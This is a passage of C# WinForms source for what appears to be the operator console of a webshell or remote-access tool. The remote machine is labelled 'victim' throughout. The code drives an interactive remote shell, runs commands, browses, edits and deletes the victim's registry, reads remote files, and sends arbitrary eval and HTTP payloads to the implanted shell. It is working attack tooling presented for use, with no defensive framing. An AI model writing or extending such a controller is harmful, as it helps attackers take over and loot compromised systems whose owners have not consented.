            await m_rShell.fnPipeCreate(textBox5.Text);

            timerShell.Interval = 300;
            timerShell.Start();
        }

        private async void timerShell_Tick(object sender, EventArgs e)
        {
            string szResp = await m_rShell.fnPipeRead();
            if (string.IsNullOrEmpty(szResp))
                return;

            try
            {
                var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
                if (objJson == null)
                    return;

                string status = objJson.status;
                if (status != "success")
                    return;

                Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);

                string szb64Msg = objJson.msg;
                byte[] abBuffer = Convert.FromBase64String(szb64Msg);

                string szText = Encoding.UTF8.GetString(abBuffer);
                byte[] abBytes = encoding.GetBytes(szText);

                szb64Msg = Convert.ToBase64String(abBytes);
                if (string.IsNullOrEmpty(szb64Msg))
                    return;

                if (m_victim.m_bUnixLike)
                    webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
                else
                    webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
            }
            catch
            {

            }
        }

        private async void textBox5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szCmd = textBox5.Text.Trim() + "\r\n";

                byte[] payloadBytes = Encoding.UTF8.GetBytes(szCmd);
                string b64Payload = Convert.ToBase64String(payloadBytes);

                await m_rShell.fnPipeWrite(b64Payload);

                textBox5.Text = string.Empty;
            }
        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {

        }

        private async void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (richTextBox1.Tag == null)
                return;

            int nPrompt = (int)richTextBox1.Tag;

            if (e.KeyCode == Keys.Enter)
            {
                string cmd = richTextBox1.Text.Substring(nPrompt);

                await fnShellExecute(cmd);

                e.Handled = true;
                e.SuppressKeyPress = true;

                return;
            }

            if (richTextBox1.SelectionStart <= nPrompt)
            {
                if (e.KeyCode == Keys.Back || e.KeyCode == Keys.Delete || e.KeyCode == Keys.Left || e.KeyCode == Keys.Right)
                {
                    e.Handled = true;
                    e.SuppressKeyPress = true;
                }
            }

            if (e.KeyCode == Keys.Back && richTextBox1.SelectionStart <= nPrompt && richTextBox1.SelectionLength == 0)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void richTextBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (richTextBox1.Tag == null)
                return;

            int nPrompt = (int)richTextBox1.Tag;

            if (richTextBox1.SelectionStart < nPrompt)
            {
                e.Handled = true;
                return;
            }
        }

        private async void treeView5_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode nodeSelected = treeView5.SelectedNode;
            if (nodeSelected == null)
                return;

            textBox7.Text = nodeSelected.FullPath;

            if (nodeSelected.Parent == null)
            {
                //Computer

                toolStripStatusLabel4.Text = "Loading...";

                var result = await m_winReg.fnHives();
                foreach (string szKey in result.Keys)
                {
                    if (result[szKey])
                    {
                        TreeNode node = new TreeNode(szKey);
                        node.ImageKey = "key";
                        node.SelectedImageKey = node.ImageKey;

                        if (fnFindNodeWithFullPath(treeView5.Nodes, $"Computer\\{node.Text}") == null)
                            nodeSelected.Nodes.Add(node);
                    }
                }

                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
            }
            else
            {
                // Scan

                toolStripStatusLabel4.Text = "Loading...";

                var result = await m_winReg.fnScan(nodeSelected.FullPath.Replace("Computer\\", string.Empty));
                if (result == null)
                    return;

                var subkeys = result.Subkeys;
                foreach (string szSubKey in subkeys)
                {
                    if (fnFindNodeWithFullPath(treeView5.Nodes, "Computer\\" + szSubKey) != null)
                        continue;

                    TreeNode node = new TreeNode(szSubKey.Replace(nodeSelected.FullPath.Replace("Computer\\", string.Empty) + "\\", string.Empty));
                    node.ImageKey = "key";
                    node.SelectedImageKey = node.ImageKey;

                    nodeSelected.Nodes.Add(node);
                }

                nodeSelected.Expand();

                listView3.Items.Clear();

                var values = result.Values;
                foreach (var value in values)
                {
                    ListViewItem item = new ListViewItem(value.Name);
                    item.SubItems.Add(value.Type);
                    item.SubItems.Add(clsfnWinReg.fnFormatRegistryValue(value.Type, value.Data));
                    item.ImageKey = value.Type.Contains("SZ") ? "reg_ab" : "reg_01";

                    listView3.Items.Add(item);

                    clsfnWinReg.stRegItem regItem = new clsfnWinReg.stRegItem();
                    regItem.szName = value.Name;
                    regItem.szType = value.Type;

                    if (value.Type.Contains("BINARY"))
                    {
                        regItem.abData = value.Data;
                    }
                    else if (value.Type.Contains("DWORD"))
                    {
                        if (value.Data != null && value.Data.Length == 4)
                        {
                            regItem.nData = BitConverter.ToUInt32(value.Data, 0);
                        }
                        else
                        {
                            string dwordText = Encoding.UTF8.GetString(value.Data);
                            if (uint.TryParse(dwordText, out uint parsedDword))
                                regItem.nData = parsedDword;
                            else
                                regItem.nData = 0;
                        }
                    }
                    else if (value.Type.Contains("QWORD"))
                    {
                        regItem.nData = BitConverter.ToUInt64(value.Data, 0);
                    }
                    else if (value.Type.Contains("MULTI"))
                    {
                        regItem.asData = Encoding.UTF8.GetString(value.Data)
                            .TrimEnd('\0')
                            .Split('\0', StringSplitOptions.RemoveEmptyEntries);
                    }
                    else
                    {
                        regItem.szData = Encoding.UTF8.GetString(value.Data).TrimEnd('\0');
                    }

                    item.Tag = regItem;
                }

                string szBasePath = nodeSelected.FullPath.Replace("Computer\\", string.Empty);
                m_winReg.m_szCurrentPath = szBasePath;

                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
            }
        }

        private async void textBox3_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szResp = await m_rShell.fnShellExec(textBox3.Text);

                textBox3.Clear();
                richTextBox2.Clear();

                richTextBox2.AppendText(szResp);
                richTextBox2.ScrollToCaret();
            }
            else if (e.KeyCode == Keys.Up)
            {

            }
            else if (e.KeyCode == Keys.Down)
            {

            }
        }

        private void frmControlPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            fnClose();
        }

        // Registry.Edit
        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;
            if (regItem.szType.Contains("BINARY"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.abData);
            else if (regItem.szType.Contains("WORD"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.nData);
            else if (regItem.szType.Contains("MULTI"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.asData);
            else
                fnRegSetValue(regItem.szName, regItem.szType, regItem.szData);
        }

        // Registry.RenameValue
        private async void toolStripMenuItem30_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;

            string szNewName = Interaction.InputBox("Name: ", "Rename", string.Empty).Trim();
            if (string.IsNullOrEmpty(szNewName))
            {
                MessageBox.Show("Value name cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            bool bVal = await m_winReg.fnbRenameValue(m_winReg.m_szCurrentPath, regItem.szName, szNewName);
            if (!bVal)
            {
                MessageBox.Show("Cannot delete: " + regItem.szName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            fnRegRefresh();
        }

        // Registry.DeleteValue
        private async void toolStripMenuItem31_Click(object sender, EventArgs e)
        {
            int nCount = listView3.SelectedItems.Cast<ListViewItem>().ToList().Count;
            if (nCount == 0)
                return;

            DialogResult dr = MessageBox.Show($"Are you sure to delete {nCount} value{(nCount == 0 ? string.Empty : "s")}?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dr != DialogResult.Yes)
                return;

            foreach (ListViewItem item in listView3.SelectedItems)
            {
                if (item.Tag == null)
                    continue;

                try
                {
                    var regItem = (clsfnWinReg.stRegItem)item.Tag;
                    var result = await m_winReg.fnDeleteValue(m_winReg.m_szCurrentPath, regItem.szName);

                    if (!result.bSuccess)
                        throw new Exception($"Cannot delete: {regItem.szName}\n{result.szErrorMsg}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }

            fnRegRefresh();
        }

        private async void toolStripButton8_Click(object sender, EventArgs e)
        {
            await fnRegInit();
        }

        private async void toolStripLabel3_Click(object sender, EventArgs e)
        {
            await fnWinUserInit();
        }

        private void toolStripMenuItem32_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var stEntry = fnFileGetItemTag(item);
                if (!stEntry.bIsDirectory)
                    fnFileRead(stEntry.szEntryPath);
            }
        }

        private async void toolStripMenuItem33_Click(object sender, EventArgs e)
        {
            frmFileHexEditor? f = fnFindForm<frmFileHexEditor>();
            if (f == null)
            {
                f = new frmFileHexEditor(this);
                f.Text = "Hex Editor";
                f.Show();
            }

            f.BringToFront();

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                if (entry.bIsDirectory)
                    continue;

                byte[]? abData = await m_fileMgr.fnReadBuffer(entry.szEntryPath);
                if (abData == null)
                {
                    MessageBox.Show("Null buffer: " + entry.szEntryPath, "IsNull", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    continue;
                }

                f.fnShowFile(entry.szEntryPath, abData);
            }
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            ListViewItem item = items.First();
            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
            if (string.IsNullOrEmpty(szDir))
                return;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                fnFileAddPathToTreeView(szDir);

            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);

            tabControl2.SelectedIndex = 0;
            treeView3.SelectedNode = node;

            Task.Run(() =>
            {
                string szFileName = string.Empty;
                Dictionary<ListViewItem, clsfnFileMgr.stEntry> dic = new Dictionary<ListViewItem, clsfnFileMgr.stEntry>();

                Invoke(() =>
                {
                    szFileName = item.SubItems[0].Text;
                    var items = listView2.Items.Cast<ListViewItem>()
                            .Select(item => new { Item = item, Entry = fnFileGetItemTag(item) })
                            .Where(x => !x.Entry.bIsDirectory)
                            .ToList();

                    foreach (var x in items)
                        dic[x.Item] = x.Entry;
                });

                foreach (var item in dic.Keys)
                {
                    if (string.Equals(dic[item].szEntryName, szFileName))
                    {
                        Invoke(() =>
                        {
                            item.Selected = true;
                            item.EnsureVisible();
                        });

                        break;
                    }
                }
            });
        }

        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            ListViewItem item = items.First();
            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
            if (string.IsNullOrEmpty(szDir))
                return;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                fnFileAddPathToTreeView(szDir);

            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);

            tabControl2.SelectedIndex = 0;
            treeView3.SelectedNode = node;
        }

        private void toolStripMenuItem36_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            string szData = string.Join(Environment.NewLine, items.Select(x => x.Text).ToArray());
            Clipboard.SetText(szData);
        }

        private void toolStripMenuItem37_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            string szData = string.Join(Environment.NewLine, items.Select(x => x.SubItems[1].Text).ToArray());
            Clipboard.SetText(szData);
        }

        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
            if (!Directory.Exists(szLocalSaveDirPath))
                Directory.CreateDirectory(szLocalSaveDirPath);

            Process.Start("explorer.exe", szLocalSaveDirPath);
        }

        private void listView3_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;
            if (regItem.szType.Contains("BINARY"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.abData);
            else if (regItem.szType.Contains("WORD"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.nData);
            else if (regItem.szType.Contains("MULTI"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.asData);
            else
                fnRegSetValue(regItem.szName, regItem.szType, regItem.szData);
        }

        // RegistryTree.CopyKeyName
        private void toolStripMenuItem38_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            Clipboard.SetText(node.Text);
        }

        // Registry.CopyName
        private void toolStripMenuItem45_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.Text).ToArray());
            Clipboard.SetText(szText);
        }

        // Registry.CopyType
        private void toolStripMenuItem46_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.SubItems[1].Text).ToArray());
            Clipboard.SetText(szText);
        }

        // Registry.CopyData
        private void toolStripMenuItem47_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.SubItems[2].Text).ToArray());
            Clipboard.SetText(szText);
        }

        // RegistryTree.Rename
        private async void toolStripMenuItem39_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szNewName = Interaction.InputBox("New name:", "Rename", string.Empty);
            if (string.IsNullOrEmpty(szNewName))
            {
                MessageBox.Show("Key name cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            bool bVal = await m_winReg.fnbRenameKey(Path.Combine(szBasePath, node.Text), Path.Combine(szBasePath, szNewName));
            if (!bVal)
            {
                MessageBox.Show("Cannot rename: " + node.Text);
                return;
            }

            node.Nodes.Clear();
            listView3.Items.Clear();

            node.Text = szNewName;

            treeView5.SelectedNode = null;
            treeView5.SelectedNode = node;
        }

        // RegistryTree.Export
        private async void toolStripMenuItem43_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            var result = await m_winReg.fnExport(szBasePath);
            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg, "Export", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, result.Output);
            }
        }

        // RegistryTree.ExpandAll
        private void toolStripMenuItem41_Click(object sender, EventArgs e)
        {
            treeView5.ExpandAll();
        }

        // RegistryTree.CollapseAll
        private void toolStripMenuItem40_Click(object sender, EventArgs e)
        {
            treeView5.CollapseAll();
        }

        // RegistryTree.Delete
        private async void toolStripMenuItem42_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            var result = await m_winReg.fnDeleteKey(szBasePath);
            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg, "DeleteValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            listView3.Items.Clear();

            TreeNode nodeParent = node.Parent;
            treeView5.SelectedNode = null;
            treeView5.Nodes.Remove(node);
            treeView5.SelectedNode = nodeParent;
        }

        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            try
            {
                string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                File.WriteAllText(szFilePath, textEditorControl1.Text);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void textEditorControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.Modifiers == Keys.S)
                {
                    try
                    {
                        string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                        File.WriteAllText(szFilePath, textEditorControl1.Text);

                        toolStripStatusLabel7.Text = "Saved";
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void toolStripButton13_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "eval_" + clsTool.fnszGenerateFileNameWithDateTime();
            sfd.InitialDirectory = m_victim.m_szPortfolio;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, m_ctrlEvalEditor.Text);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void toolStripButton11_Click(object sender, EventArgs e)
        {
            try
            {
                var resp = await m_runScript.fnHttpPOST(textBox11.Text, m_ctrlPostEditor.Text);
                m_ctrlEvalBrowser.DocumentText = resp.data;

                toolStripStatusLabel3.Text = $"Status: {resp.http_code} | Length: {resp.data.Length}";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripButton12_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "post_" + clsTool.fnszGenerateFileNameWithDateTime();
            sfd.InitialDirectory = m_victim.m_szPortfolio;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, m_ctrlPostEditor.Text);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void textBox11_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                try
                {
                    var resp = await m_runScript.fnHttpGET(textBox11.Text);
                    m_ctrlEvalBrowser.DocumentText = resp.data;

                    toolStripStatusLabel3.Text = $"Status: {resp.http_code} | Length: {resp.data.Length}";
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton15_Click(object sender, EventArgs e)
        {
            fnFileMgrRefresh();
        }

        private async void toolStripButton14_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
            treeView3.Nodes.Clear();

            var fileInit = await m_fileMgr.fnszInit();

            textBox1.Text = fileInit.szCurrentDir;
            m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
            foreach (string szName in fileInit.lsLogicalDrive)
            {
                TreeNode node = new TreeNode(szName);
                node.ImageKey = "harddrive";
                treeView3.Nodes.Add(node);
            }

            fnFileAddPathToTreeView(fileInit.szCurrentDir);
            treeView3.ExpandAll();

            TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
            treeView3.SelectedNode = cdNode;
        }

        private void splitContainer7_SplitterMoved(object sender, SplitterEventArgs e)
        {

        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode node = treeView1.SelectedNode;
            if (node == null)
                return;

            string szDir = Path.Combine(Application.StartupPath, "Plugins", node.FullPath);

            var manifest = m_plugin.fnLoadPluginManifest(szDir);
            if (manifest == null || !manifest.HasValue)
            {
                string szIndexPath = Path.Combine(szDir, "index.html");
                string[] nodes = node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToArray();

                foreach (string szDirName in Directory.GetDirectories(szDir))
                {
                    if (nodes.Contains(Path.GetFileName(szDirName)))
                        continue;

                    TreeNode nodeDir = new TreeNode(Path.GetFileName(szDirName));
                    node.Nodes.Add(nodeDir);
                }

                node.Expand();

                if (!File.Exists(szIndexPath))
                    return;

                webViewPlugin.CoreWebView2.Navigate(szIndexPath);

                return;
            }

            var plugin = manifest.Value;

            string szHtmlPath = Path.Combine(Application.StartupPath, "Plugins", node.FullPath, "index.html");
            webViewPlugin.CoreWebView2.Navigate(szHtmlPath);

            textBox12.Text = node.FullPath;
        }
    }
}
